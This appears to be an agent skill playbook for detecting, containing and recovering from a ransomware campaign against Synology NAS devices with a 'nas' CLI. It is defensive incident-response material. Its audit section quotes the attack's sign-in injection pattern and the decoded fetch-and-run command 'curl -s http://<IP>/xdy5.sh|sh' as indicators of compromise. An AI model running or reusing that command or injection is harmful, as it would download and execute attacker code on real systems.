---
name: synology-ransomware-response
description: Playbook for the C3RB3R / .L0CK3D ransomware campaign against Synology NAS (Synology-SA-26:13, SA-26:14) using `nas incident` and `nas incident fix` from synology-nas-cli - audit, isolate, check for compromise, harden (firewall, QuickConnect, SMB1, AutoBlock, admin, snapshots, WORM trap), restore from snapshots. Use for ransomware, L0CK3D, LOCK3D, read-me3.txt, C3RB3R, encrypted NAS, Synology hacked, NAS exposed to internet, SA-26:13, SA-26:14, PHP2Shell, harden Synology, 勒索, 群暉被加密.
---

# C3RB3R / `.L0CK3D` response with `nas`

Background, advisory tables and sources: `docs/INCIDENT-C3RB3R.md`. CLI setup and credentials: the synology-nas skill.

Signs of this campaign: files renamed `*.L0CK3D` (zero) or `*.LOCK3D`, a `read-me3.txt` ("C3RB3R INSTRUCTIONS") in each folder. Entry point: DSM reachable from the internet on a build without the SA-26:13 fix (DSM 7.1 and older get no fix).

## 1. Audit (read-only)

```bash
nas incident                 # PASS/WARN/FAIL/SKIP per item, exit 1 on any FAIL
nas incident --probe --scan  # + public port probe from this machine + ransom-note search (minutes)
nas incident --deep          # + indicators of compromise: root-only logs, cron, files, users, SSH keys, processes
nas --json incident          # {"items": [{id, status, detail, hint, fix}], "summary": {...}}
```

Items: `dsm_version`, `sa_26_14_packages`, `firewall`, `quickconnect`, `router_port_forwarding`, `public_ports` (`--probe`), `external_signins`, `failed_signins`, `autoblock`, `smb_min_protocol`, `admin_account`, `snapshot_schedule:<share>`, `snapshot_worm:<share>`, `ransomware_files` (`--scan`). SKIP lines state the reason (flag missing, API error, feature absent).

`exploit_attempts` WARN = the CVE-2024-10441 sign-in injection (`PLUGIN_VALUE_END` / `LD_DEBUG_OUTPUT=/etc/cron.d/synot*`, decoded command `curl -s http://<IP>/xdy5.sh|sh`) reached DSM; whether it worked is what the `--deep` items show: `ioc_cron` (planted `/etc/cron.d/synot*`), `ioc_binaries` (`/bin/libgld`, `/bin/qnetd`, `/bin/l0ck.enc`, `xdy5*`), `ioc_users`, `ioc_ssh_keys`, `ioc_processes` (FAIL = known-bad hit, WARN = unknown). Indicator table: `docs/INCIDENT-C3RB3R.md`.

## 2. If `ransomware_files` or `external_signins` is FAIL: isolate first

- Cut the internet path: `nas incident fix --only quickconnect,router_port_forwarding --yes`, remove port forwards on the router, or unplug the NAS's WAN side (PPPoE on the NAS: its own uplink). Keep a LAN path to investigate.
- Disconnect computers that mount the shares (a compromised client keeps encrypting over SMB).
- Network off stops remote control; shutting the NAS down stops a running encryptor but loses in-memory state.
- Keep evidence: ransom notes, a few encrypted files, `nas --json logs --limit 20000`, `nas --json inventory`, Log Center export.
- Look for: unknown users or administrators, unknown Task Scheduler entries (root scripts), unknown packages or containers, SSH/Telnet turned on (`nas services`), sign-ins from unknown addresses (`nas logs`).

## 3. Fix

```bash
nas incident fix --dry-run                     # plan: each change current -> new, exact API calls, DSM UI path
nas incident fix --yes                         # apply in order, read each back, audit again (before -> after)
nas incident fix --only firewall,smb_min_protocol --yes
nas incident fix --ransom-scan --yes            # a clean scan also allows the snapshot fixes
nas incident fix --upgrade --rotate-password --yes   # + DSM upgrade (asks again on PreCheck notes) + new random password
```

Order applied: snapshot_worm, snapshots, packages, smb_min_protocol, quickconnect, router_port_forwarding, autoblock, admin_account, firewall, rotate_password, upgrade. Without a terminal and without `--yes` nothing is applied.

| Fix | CLI | DSM web UI | Raw call |
|---|---|---|---|
| Immutable lock off where unsupported | `--only snapshot_worm` | hidden on unsupported models (API only) | `nas api SYNO.DisasterRecovery.Retention set_worm_lock --version 1 type=Share name=SHARE worm_lock_enable=false worm_lock_day=7 --allow-write` |
| Daily snapshot schedule on shares that have none (14-day retention only where none is set; existing schedules untouched); needs a clean `--ransom-scan` in the same run or `--i-know-snapshots-may-rotate` | `--only snapshots [--share S]` | Snapshot Replication > Snapshots > share > Settings (Snapshot Replication > 快照 > 設定) | `SYNO.Core.Share.Snapshot set_schedule --version 1 ...`, `SYNO.DisasterRecovery.Retention set --version 1 ... policyType=64 retainDay=14` |
| Stop SA-26:14 packages | `--only packages` | Package Center > Installed (套件中心 > 已安裝) | `SYNO.Core.Package.Control stop --version 1 id=ID` |
| SMB minimum SMB2 | `--only smb_min_protocol` | Control Panel > File Services > SMB > Advanced Settings (控制台 > 檔案服務 > SMB > 進階設定) | `SYNO.Core.FileServ.SMB set --version 3 smb_min_protocol=1 smb_max_protocol=3` |
| QuickConnect + its port forwarding off | `--only quickconnect` | Control Panel > External Access > QuickConnect (控制台 > 外部存取 > QuickConnect) | `SYNO.Core.QuickConnect set --version 2 enabled=false`; `SYNO.Core.QuickConnect.Upnp set --version 1 enabled=false` |
| Router (UPnP) rules disabled | `--only router_port_forwarding` | Control Panel > External Access > Router Configuration (控制台 > 外部存取 > 路由器設定) | `SYNO.Core.PortForwarding.Rules save --version 1 rules=[...] task_id_suffix=PF` |
| AutoBlock on + allow this computer (as DSM logged it) and `allowed_networks`; `127.0.0.1` only with `incident.autoblock_allow_loopback` | `--only autoblock` | Control Panel > Security > Protection (控制台 > 安全性 > 保護) | `SYNO.Core.Security.AutoBlock set --version 1 enable=true attempts=10 within_mins=5 ...`; `SYNO.Core.Security.AutoBlock.Rules create --version 1 type=allow block_days=0 overwrite=true 'ip=["127.0.0.1"]'` |
| Built-in admin disabled | `--only admin_account` | Control Panel > User & Group > admin > Edit (控制台 > 使用者與群組) | `SYNO.Core.User set` answers 105 from a password session; as root: `/usr/syno/bin/synowebapi --exec api=SYNO.Core.User method=set version=1 name='"admin"' expired='"now"'` in a one-off root Task Scheduler task (what the CLI does) |
| Firewall: allow this computer's /32 + `allowed_networks` on LAN interfaces, drop the rest on every interface | `--only firewall` | Control Panel > Security > Firewall > Edit Rules (控制台 > 安全性 > 防火牆) | `SYNO.Core.Security.Firewall.Profile set ...`, `SYNO.Core.Security.Firewall.Profile.Apply start ...` |
| New random password, stored and verified | `--rotate-password` | Personal > Account (個人 > 帳號) | `SYNO.Core.NormalUser set --version 2 password=... old_password=...` |
| DSM upgrade | `--upgrade` | Control Panel > Update & Restore (控制台 > 更新與還原) | `nas upgrade --yes` |

Raw calls are written as `nas api NAME METHOD --version N k=v ... --allow-write`; `--dry-run` prints the exact ones with current values.

Firewall facts: the allowed set is the address DSM logged for this session (`/32`) plus the IPv4 `allowed_networks` (empty = this computer only; IPv6 entries are not written, so IPv6 sources are dropped), placed on the LAN interfaces (`global` when the profile has none). The change is refused when proxies are configured, the origin is loopback or public, or the logged source is loopback/IPv6/public or differs from this computer's local address. After applying, a fresh login over the same origin is verified; on failure the output lists rescue paths (another LAN computer, Synology Assistant / find.synology.com, Tailscale userspace mode reaches DSM as 127.0.0.1, RESET button mode 1). A NAS with its own public address (PPPoE on the NAS, DMZ) has no NAT in front: the DSM firewall is the only layer, and 100.64.0.0/10 there is also the CGNAT range on the WAN side.

Snapshot fixes: starting snapshots applies the share's retention policy, which can delete older snapshots that are needed to restore encrypted files; `snapshot_worm` and `snapshots` therefore run only after a clean `--ransom-scan` in the same run, or with `--i-know-snapshots-may-rotate`.

Password rotation needs a writable store: a 1Password reference (written with `op item edit` on stdin; the old value stays in the item history) or the keychain entry from `nas login --save` (old value copied to `<store_service>-previous`). The store is written before DSM is changed; a DSM refusal puts the old password back. Disabling `admin` needs another enabled administrator. Other administrator accounts and service accounts are changed in Control Panel > User & Group.

## 4. Restore from snapshots

- Snapshots are read-only Btrfs subvolumes; an encryptor working through shares cannot alter them, an administrator-level attacker can delete non-immutable ones.
- Pick the newest snapshot older than the first encrypted file: Snapshot Replication > Snapshots > share. Names are NAS local time (`GMT+01-2026.10.30-03.30.01`). With "Make snapshot visible", File Station shows them under `#snapshot`.
- Whole share: Restore to this snapshot (later changes in that share are lost; copy clean newer files out first). Single files: copy from `#snapshot`, or Browse > Restore.
- Hyper Backup: Restore > Data, pick a version before the encryption. Two-way sync targets may already contain encrypted copies.
- Afterwards: `nas incident --scan` again; `nas incident` shows whether schedules are on and snapshots recent.

## 5. Afterwards

- `nas alert-deploy` runs `nas alert --push` on the NAS every 10 minutes (stale snapshots, WORM trap, external sign-ins, firewall off, disk/UPS state) and wires DSM's own notifications to the same webhook; `docs/ALERTS.md` has manual and cron/launchd alternatives.
- Decryptors: https://www.nomoreransom.org.
